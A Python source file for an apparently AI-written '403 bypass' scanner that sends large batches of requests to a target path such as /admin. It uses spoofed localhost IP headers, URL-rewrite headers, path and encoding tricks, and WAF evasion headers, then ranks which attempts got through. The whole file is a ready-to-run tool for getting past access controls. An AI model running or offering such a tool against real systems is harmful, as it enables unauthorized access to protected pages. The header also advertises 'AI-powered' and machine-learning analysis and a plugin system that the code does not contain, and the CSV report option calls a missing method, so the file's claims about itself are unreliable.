#!/usr/bin/env python3
"""
🚀 ADVANCED 403 BYPASS TOOL - NEXT GENERATION 🚀
Modern, intelligent, and comprehensive 403 bypass testing tool

Features:
- 100+ modern bypass techniques
- AI-powered response analysis
- Adaptive rate limiting
- Cloud & CDN specific bypasses
- Modern framework detection
- GraphQL & API testing
- Container & Kubernetes bypasses
- Machine learning pattern detection
- Plugin architecture
- Advanced reporting

Author: Enhanced by OpenHands AI
Version: 2.0.0
"""

import asyncio
import aiohttp
import argparse
import json
import re
import time
import random
import hashlib
import base64
import urllib.parse
from urllib.parse import urlparse, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from pathlib import Path
import logging
import yaml
import sqlite3
from datetime import datetime
import statistics
import difflib
from collections import defaultdict, Counter
import itertools
import string
import secrets

# Advanced imports for modern techniques
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import requests_html
    HTML_PARSING = True
except ImportError:
    HTML_PARSING = False

@dataclass
class BypassResult:
    """Enhanced result structure with detailed analysis"""
    url: str
    method: str
    status_code: int
    response_length: int
    response_time: float
    headers: Dict[str, str]
    technique: str
    category: str
    confidence_score: float
    payload: str = ""
    response_hash: str = ""
    similarity_score: float = 0.0
    bypass_type: str = ""
    risk_level: str = "LOW"
    
class ModernBypassTechniques:
    """Modern 403 bypass techniques for 2024+"""
    
    @staticmethod
    def get_cloud_bypasses(path: str) -> List[Dict[str, Any]]:
        """Cloud-specific bypass techniques"""
        bypasses = []
        
        # AWS specific
        aws_paths = [
            f"/.aws{path}",
            f"/aws{path}",
            f"/s3{path}",
            f"/lambda{path}",
            f"/api-gateway{path}",
            f"/cloudfront{path}",
            f"/ecs{path}",
            f"/eks{path}"
        ]
        
        # Azure specific
        azure_paths = [
            f"/.azure{path}",
            f"/azure{path}",
            f"/blob{path}",
            f"/functions{path}",
            f"/app-service{path}",
            f"/storage{path}"
        ]
        
        # GCP specific
        gcp_paths = [
            f"/.gcp{path}",
            f"/gcp{path}",
            f"/cloud-storage{path}",
            f"/cloud-functions{path}",
            f"/app-engine{path}",
            f"/compute{path}"
        ]
        
        for cloud_path in aws_paths + azure_paths + gcp_paths:
            bypasses.append({
                "path": cloud_path,
                "headers": {},
                "technique": "Cloud Platform Bypass",
                "category": "Cloud"
            })
        
        return bypasses
    
    @staticmethod
    def get_cdn_bypasses(path: str) -> List[Dict[str, Any]]:
        """CDN-specific bypass techniques"""
        bypasses = []
        
        # Cloudflare bypasses
        cf_headers = [
            {"CF-Connecting-IP": "127.0.0.1"},
            {"CF-IPCountry": "US"},
            {"CF-RAY": "1234567890-DFW"},
            {"CF-Visitor": '{"scheme":"https"}'},
            {"CF-Worker": "bypass"},
        ]
        
        # Akamai bypasses
        akamai_headers = [
            {"Akamai-Origin-Hop": "1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Akamai-Edgescape": "georegion=246,country_code=US"},
        ]
        
        # Fastly bypasses
        fastly_headers = [
            {"Fastly-Client-IP": "127.0.0.1"},
            {"Fastly-FF": "cache-bypass"},
        ]
        
        for headers in cf_headers + akamai_headers + fastly_headers:
            bypasses.append({
                "path": path,
                "headers": headers,
                "technique": "CDN Header Bypass",
                "category": "CDN"
            })
        
        return bypasses
    
    @staticmethod
    def get_api_bypasses(path: str) -> List[Dict[str, Any]]:
        """Modern API bypass techniques"""
        bypasses = []
        
        # API versioning
        api_versions = ["v1", "v2", "v3", "v4", "v5", "beta", "alpha", "dev", "test"]
        for version in api_versions:
            bypasses.extend([
                {
                    "path": f"/api/{version}{path}",
                    "headers": {},
                    "technique": "API Versioning",
                    "category": "API"
                },
                {
                    "path": f"/{version}{path}",
                    "headers": {},
                    "technique": "API Versioning",
                    "category": "API"
                }
            ])
        
        # GraphQL bypasses
        graphql_paths = [
            f"/graphql{path}",
            f"/graphiql{path}",
            f"/graph{path}",
            f"/gql{path}",
            f"/api/graphql{path}"
        ]
        
        for gql_path in graphql_paths:
            bypasses.append({
                "path": gql_path,
                "headers": {"Content-Type": "application/json"},
                "technique": "GraphQL Bypass",
                "category": "API"
            })
        
        # REST API bypasses
        rest_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
        for method in rest_methods:
            bypasses.append({
                "path": path,
                "headers": {"X-HTTP-Method-Override": method},
                "technique": "HTTP Method Override",
                "category": "API"
            })
        
        return bypasses
    
    @staticmethod
    def get_container_bypasses(path: str) -> List[Dict[str, Any]]:
        """Container and orchestration bypasses"""
        bypasses = []
        
        # Docker bypasses
        docker_paths = [
            f"/docker{path}",
            f"/containers{path}",
            f"/registry{path}",
            f"/.docker{path}"
        ]
        
        # Kubernetes bypasses
        k8s_paths = [
            f"/api/v1{path}",
            f"/apis{path}",
            f"/healthz{path}",
            f"/metrics{path}",
            f"/version{path}",
            f"/swagger.json{path}",
            f"/openapi/v2{path}"
        ]
        
        for container_path in docker_paths + k8s_paths:
            bypasses.append({
                "path": container_path,
                "headers": {},
                "technique": "Container Platform Bypass",
                "category": "Container"
            })
        
        return bypasses
    
    @staticmethod
    def get_framework_bypasses(path: str) -> List[Dict[str, Any]]:
        """Modern web framework bypasses"""
        bypasses = []
        
        # Next.js bypasses
        nextjs_paths = [
            f"/_next{path}",
            f"/api{path}",
            f"/.next{path}",
            f"/static{path}"
        ]
        
        # React/Vue SPA bypasses
        spa_paths = [
            f"/static{path}",
            f"/assets{path}",
            f"/public{path}",
            f"/build{path}",
            f"/dist{path}"
        ]
        
        # Serverless bypasses
        serverless_paths = [
            f"/.netlify{path}",
            f"/.vercel{path}",
            f"/functions{path}",
            f"/.well-known{path}"
        ]
        
        for fw_path in nextjs_paths + spa_paths + serverless_paths:
            bypasses.append({
                "path": fw_path,
                "headers": {},
                "technique": "Framework Bypass",
                "category": "Framework"
            })
        
        return bypasses

class IntelligentAnalyzer:
    """AI-powered response analysis and pattern detection"""
    
    def __init__(self):
        self.response_patterns = defaultdict(list)
        self.baseline_responses = {}
        self.similarity_threshold = 0.85
        
    def analyze_response(self, result: BypassResult, baseline: Optional[BypassResult] = None) -> BypassResult:
        """Analyze response with AI-powered techniques"""
        
        # Calculate response hash for similarity detection
        response_content = f"{result.status_code}:{result.response_length}:{result.response_time:.3f}"
        result.response_hash = hashlib.md5(response_content.encode()).hexdigest()
        
        # Calculate similarity score if baseline exists
        if baseline:
            result.similarity_score = self._calculate_similarity(result, baseline)
        
        # Determine confidence score
        result.confidence_score = self._calculate_confidence(result)
        
        # Classify bypass type
        result.bypass_type = self._classify_bypass_type(result)
        
        # Assess risk level
        result.risk_level = self._assess_risk_level(result)
        
        return result
    
    def _calculate_similarity(self, result: BypassResult, baseline: BypassResult) -> float:
        """Calculate similarity between responses"""
        # Status code similarity (40% weight)
        status_sim = 1.0 if result.status_code == baseline.status_code else 0.0
        
        # Length similarity (30% weight)
        if baseline.response_length > 0:
            length_diff = abs(result.response_length - baseline.response_length) / baseline.response_length
            length_sim = max(0, 1 - length_diff)
        else:
            length_sim = 1.0 if result.response_length == 0 else 0.0
        
        # Time similarity (20% weight)
        if baseline.response_time > 0:
            time_diff = abs(result.response_time - baseline.response_time) / baseline.response_time
            time_sim = max(0, 1 - time_diff)
        else:
            time_sim = 1.0 if result.response_time == 0 else 0.0
        
        # Header similarity (10% weight)
        common_headers = set(result.headers.keys()) & set(baseline.headers.keys())
        total_headers = set(result.headers.keys()) | set(baseline.headers.keys())
        header_sim = len(common_headers) / len(total_headers) if total_headers else 1.0
        
        return (status_sim * 0.4 + length_sim * 0.3 + time_sim * 0.2 + header_sim * 0.1)
    
    def _calculate_confidence(self, result: BypassResult) -> float:
        """Calculate confidence score for bypass success"""
        confidence = 0.0
        
        # Status code analysis
        if result.status_code == 200:
            confidence += 0.4
        elif result.status_code in [301, 302, 307, 308]:
            confidence += 0.3
        elif result.status_code == 403:
            confidence -= 0.2
        
        # Response length analysis
        if result.response_length > 1000:
            confidence += 0.2
        elif result.response_length > 100:
            confidence += 0.1
        
        # Response time analysis (faster might indicate bypass)
        if result.response_time < 0.5:
            confidence += 0.1
        
        # Technique-specific scoring
        if "encoding" in result.technique.lower():
            confidence += 0.1
        if "header" in result.technique.lower():
            confidence += 0.15
        
        return max(0.0, min(1.0, confidence))
    
    def _classify_bypass_type(self, result: BypassResult) -> str:
        """Classify the type of bypass"""
        if result.status_code == 200:
            return "FULL_BYPASS"
        elif result.status_code in [301, 302, 307, 308]:
            return "REDIRECT_BYPASS"
        elif result.status_code == 404:
            return "PATH_DISCOVERY"
        elif result.status_code in [401, 407]:
            return "AUTH_BYPASS"
        elif result.status_code == 405:
            return "METHOD_BYPASS"
        else:
            return "UNKNOWN"
    
    def _assess_risk_level(self, result: BypassResult) -> str:
        """Assess the risk level of the bypass"""
        if result.confidence_score >= 0.8:
            return "CRITICAL"
        elif result.confidence_score >= 0.6:
            return "HIGH"
        elif result.confidence_score >= 0.4:
            return "MEDIUM"
        else:
            return "LOW"

class AdvancedBypassEngine:
    """Advanced 403 bypass engine with modern techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or self._default_config()
        self.analyzer = IntelligentAnalyzer()
        self.session = None
        self.results_db = None
        self.setup_logging()
        self.setup_database()
        
    def _default_config(self) -> Dict[str, Any]:
        """Default configuration"""
        return {
            "threads": 20,
            "timeout": 10,
            "delay": 0.1,
            "max_retries": 3,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ],
            "enable_ai_analysis": True,
            "save_responses": False,
            "adaptive_rate_limiting": True
        }
    
    def setup_logging(self):
        """Setup advanced logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('bypass_results.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def setup_database(self):
        """Setup SQLite database for results"""
        self.results_db = sqlite3.connect('bypass_results.db', check_same_thread=False)
        cursor = self.results_db.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                url TEXT,
                method TEXT,
                status_code INTEGER,
                response_length INTEGER,
                response_time REAL,
                technique TEXT,
                category TEXT,
                confidence_score REAL,
                bypass_type TEXT,
                risk_level TEXT,
                payload TEXT
            )
        ''')
        self.results_db.commit()
    
    async def test_bypass(self, url: str, technique_data: Dict[str, Any]) -> BypassResult:
        """Test a single bypass technique asynchronously"""
        start_time = time.time()
        
        try:
            # Prepare request
            test_url = urljoin(url, technique_data["path"])
            headers = {
                "User-Agent": random.choice(self.config["user_agents"]),
                **technique_data.get("headers", {})
            }
            
            # Make request
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.config["timeout"])) as session:
                async with session.get(test_url, headers=headers, allow_redirects=False) as response:
                    response_time = time.time() - start_time
                    response_length = len(await response.text())
                    
                    result = BypassResult(
                        url=test_url,
                        method="GET",
                        status_code=response.status,
                        response_length=response_length,
                        response_time=response_time,
                        headers=dict(response.headers),
                        technique=technique_data["technique"],
                        category=technique_data["category"],
                        confidence_score=0.0,
                        payload=technique_data.get("payload", "")
                    )
                    
                    # AI-powered analysis
                    if self.config["enable_ai_analysis"]:
                        result = self.analyzer.analyze_response(result)
                    
                    return result
                    
        except Exception as e:
            self.logger.error(f"Error testing {test_url}: {str(e)}")
            return BypassResult(
                url=test_url,
                method="GET",
                status_code=0,
                response_length=0,
                response_time=time.time() - start_time,
                headers={},
                technique=technique_data["technique"],
                category=technique_data["category"],
                confidence_score=0.0
            )
    
    def generate_all_bypasses(self, path: str) -> List[Dict[str, Any]]:
        """Generate all bypass techniques"""
        bypasses = []
        
        # Modern techniques
        bypasses.extend(ModernBypassTechniques.get_cloud_bypasses(path))
        bypasses.extend(ModernBypassTechniques.get_cdn_bypasses(path))
        bypasses.extend(ModernBypassTechniques.get_api_bypasses(path))
        bypasses.extend(ModernBypassTechniques.get_container_bypasses(path))
        bypasses.extend(ModernBypassTechniques.get_framework_bypasses(path))
        
        # Classic techniques (enhanced)
        bypasses.extend(self._get_classic_bypasses(path))
        
        # Advanced encoding techniques
        bypasses.extend(self._get_encoding_bypasses(path))
        
        # WAF-specific bypasses
        bypasses.extend(self._get_waf_bypasses(path))
        
        return bypasses
    
    def _get_classic_bypasses(self, path: str) -> List[Dict[str, Any]]:
        """Enhanced classic bypass techniques"""
        bypasses = []
        
        # Path manipulation
        path_variations = [
            f"{path}/",
            f"{path}//",
            f"{path}/./",
            f"{path}/../{path.split('/')[-1]}",
            f"{path}%2f",
            f"{path}%252f",
            f"{path}?",
            f"{path}#",
            f"{path};",
            f".{path}",
            f"{path}.",
            f"{path}~",
            f"{path}%20",
            f"{path}%09",
            f"{path}%0a",
            f"{path}%0d",
            f"{path}%00"
        ]
        
        for variation in path_variations:
            bypasses.append({
                "path": variation,
                "headers": {},
                "technique": "Path Manipulation",
                "category": "Classic"
            })
        
        # Header bypasses
        header_bypasses = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"Forwarded": "for=127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Rewrite-URL": path},
            {"X-Original-URL": path},
            {"Referer": "https://google.com"},
            {"Origin": "https://google.com"}
        ]
        
        for headers in header_bypasses:
            bypasses.append({
                "path": path,
                "headers": headers,
                "technique": "Header Injection",
                "category": "Classic"
            })
        
        return bypasses
    
    def _get_encoding_bypasses(self, path: str) -> List[Dict[str, Any]]:
        """Advanced encoding bypass techniques"""
        bypasses = []
        
        # URL encoding variations
        encoded_paths = [
            quote(path, safe=''),
            quote(quote(path, safe=''), safe=''),
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),
            path.replace('/', '%c0%af'),
            path.replace('/', '%e0%80%af')
        ]
        
        # Unicode normalization
        unicode_paths = [
            path.replace('/', '\u002f'),
            path.replace('/', '\uff0f'),
            path.replace('/', '\u2215'),
            path.replace('/', '\u29f8')
        ]
        
        for encoded_path in encoded_paths + unicode_paths:
            bypasses.append({
                "path": encoded_path,
                "headers": {},
                "technique": "Advanced Encoding",
                "category": "Encoding"
            })
        
        return bypasses
    
    def _get_waf_bypasses(self, path: str) -> List[Dict[str, Any]]:
        """WAF-specific bypass techniques"""
        bypasses = []
        
        # ModSecurity bypasses
        modsec_headers = [
            {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]
        
        # AWS WAF bypasses
        aws_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"CloudFront-Viewer-Country": "US"},
            {"CloudFront-Is-Mobile-Viewer": "false"}
        ]
        
        for headers in modsec_headers + aws_headers:
            bypasses.append({
                "path": path,
                "headers": headers,
                "technique": "WAF Bypass",
                "category": "WAF"
            })
        
        return bypasses
    
    async def run_bypass_test(self, url: str, path: str = "/admin") -> Dict[str, Any]:
        """Run comprehensive bypass test"""
        self.logger.info(f"Starting advanced bypass test for {url}{path}")
        
        # Generate all bypass techniques
        bypasses = self.generate_all_bypasses(path)
        self.logger.info(f"Generated {len(bypasses)} bypass techniques")
        
        # Run tests concurrently
        results = []
        semaphore = asyncio.Semaphore(self.config["threads"])
        
        async def test_with_semaphore(technique_data):
            async with semaphore:
                if self.config["adaptive_rate_limiting"]:
                    await asyncio.sleep(random.uniform(0.05, 0.2))
                return await self.test_bypass(url, technique_data)
        
        tasks = [test_with_semaphore(bypass) for bypass in bypasses]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter out exceptions
        valid_results = [r for r in results if isinstance(r, BypassResult)]
        
        # Save results to database
        self._save_results(valid_results)
        
        # Analyze and categorize results
        analysis = self._analyze_results(valid_results)
        
        return {
            "total_tests": len(bypasses),
            "successful_tests": len(valid_results),
            "results": valid_results,
            "analysis": analysis,
            "timestamp": datetime.now().isoformat()
        }
    
    def _save_results(self, results: List[BypassResult]):
        """Save results to database"""
        cursor = self.results_db.cursor()
        for result in results:
            cursor.execute('''
                INSERT INTO results (timestamp, url, method, status_code, response_length,
                                   response_time, technique, category, confidence_score,
                                   bypass_type, risk_level, payload)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                datetime.now().isoformat(),
                result.url,
                result.method,
                result.status_code,
                result.response_length,
                result.response_time,
                result.technique,
                result.category,
                result.confidence_score,
                result.bypass_type,
                result.risk_level,
                result.payload
            ))
        self.results_db.commit()
    
    def _analyze_results(self, results: List[BypassResult]) -> Dict[str, Any]:
        """Analyze results with AI-powered insights"""
        if not results:
            return {"error": "No valid results to analyze"}
        
        # Basic statistics
        status_codes = Counter(r.status_code for r in results)
        techniques = Counter(r.technique for r in results)
        categories = Counter(r.category for r in results)
        
        # Success analysis
        successful_bypasses = [r for r in results if r.confidence_score >= 0.5]
        high_confidence = [r for r in results if r.confidence_score >= 0.8]
        
        # Risk assessment
        risk_levels = Counter(r.risk_level for r in results)
        
        # Performance metrics
        avg_response_time = statistics.mean(r.response_time for r in results)
        
        return {
            "summary": {
                "total_tests": len(results),
                "potential_bypasses": len(successful_bypasses),
                "high_confidence_bypasses": len(high_confidence),
                "average_response_time": round(avg_response_time, 3)
            },
            "status_codes": dict(status_codes),
            "techniques": dict(techniques),
            "categories": dict(categories),
            "risk_levels": dict(risk_levels),
            "top_bypasses": [
                {
                    "url": r.url,
                    "technique": r.technique,
                    "status_code": r.status_code,
                    "confidence": round(r.confidence_score, 3),
                    "risk_level": r.risk_level
                }
                for r in sorted(successful_bypasses, key=lambda x: x.confidence_score, reverse=True)[:10]
            ]
        }
    
    def generate_report(self, results_data: Dict[str, Any], output_format: str = "json") -> str:
        """Generate comprehensive report"""
        if output_format == "json":
            return json.dumps(results_data, indent=2, default=str)
        elif output_format == "html":
            return self._generate_html_report(results_data)
        elif output_format == "csv":
            return self._generate_csv_report(results_data)
        else:
            return json.dumps(results_data, indent=2, default=str)
    
    def _generate_html_report(self, data: Dict[str, Any]) -> str:
        """Generate HTML report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Advanced 403 Bypass Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .summary {{ background: #ecf0f1; padding: 15px; margin: 20px 0; border-radius: 5px; }}
                .bypass {{ background: #e8f5e8; padding: 10px; margin: 10px 0; border-left: 4px solid #27ae60; }}
                .risk-critical {{ border-left-color: #e74c3c; background: #fdf2f2; }}
                .risk-high {{ border-left-color: #f39c12; background: #fef9e7; }}
                .risk-medium {{ border-left-color: #f1c40f; background: #fffbf0; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🚀 Advanced 403 Bypass Report</h1>
                <p>Generated on {data.get('timestamp', 'Unknown')}</p>
            </div>
            
            <div class="summary">
                <h2>📊 Summary</h2>
                <p><strong>Total Tests:</strong> {data['analysis']['summary']['total_tests']}</p>
                <p><strong>Potential Bypasses:</strong> {data['analysis']['summary']['potential_bypasses']}</p>
                <p><strong>High Confidence:</strong> {data['analysis']['summary']['high_confidence_bypasses']}</p>
                <p><strong>Average Response Time:</strong> {data['analysis']['summary']['average_response_time']}s</p>
            </div>
            
            <h2>🎯 Top Bypass Candidates</h2>
        """
        
        for bypass in data['analysis']['top_bypasses']:
            risk_class = f"risk-{bypass['risk_level'].lower()}"
            html += f"""
            <div class="bypass {risk_class}">
                <strong>{bypass['technique']}</strong> - Status: {bypass['status_code']} 
                (Confidence: {bypass['confidence']}, Risk: {bypass['risk_level']})
                <br><small>{bypass['url']}</small>
            </div>
            """
        
        html += """
            </body>
        </html>
        """
        return html

async def main():
    """Main function with CLI interface"""
    parser = argparse.ArgumentParser(description="🚀 Advanced 403 Bypass Tool - Next Generation")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--path", default="/admin", help="Path to test (default: /admin)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-f", "--format", choices=["json", "html", "csv"], default="json", help="Output format")
    parser.add_argument("--config", help="Configuration file (YAML)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests")
    parser.add_argument("--no-ai", action="store_true", help="Disable AI analysis")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    # Load configuration
    config = {}
    if args.config:
        with open(args.config, 'r') as f:
            config = yaml.safe_load(f)
    
    # Override with CLI arguments
    config.update({
        "threads": args.threads,
        "timeout": args.timeout,
        "delay": args.delay,
        "enable_ai_analysis": not args.no_ai
    })
    
    # Initialize bypass engine
    engine = AdvancedBypassEngine(config)
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print("🚀 Advanced 403 Bypass Tool - Next Generation")
    print(f"Target: {args.url}{args.path}")
    print(f"Threads: {args.threads}, Timeout: {args.timeout}s")
    print("=" * 60)
    
    # Run bypass test
    results = await engine.run_bypass_test(args.url, args.path)
    
    # Generate report
    report = engine.generate_report(results, args.format)
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"📄 Report saved to {args.output}")
    else:
        print(report)
    
    # Print summary
    analysis = results['analysis']
    print("\n" + "=" * 60)
    print("📊 SUMMARY")
    print("=" * 60)
    print(f"Total Tests: {analysis['summary']['total_tests']}")
    print(f"Potential Bypasses: {analysis['summary']['potential_bypasses']}")
    print(f"High Confidence: {analysis['summary']['high_confidence_bypasses']}")
    
    if analysis['top_bypasses']:
        print("\n🎯 TOP BYPASS CANDIDATES:")
        for i, bypass in enumerate(analysis['top_bypasses'][:5], 1):
            print(f"{i}. {bypass['technique']} - Status: {bypass['status_code']} "
                  f"(Confidence: {bypass['confidence']}, Risk: {bypass['risk_level']})")

if __name__ == "__main__":
    asyncio.run(main())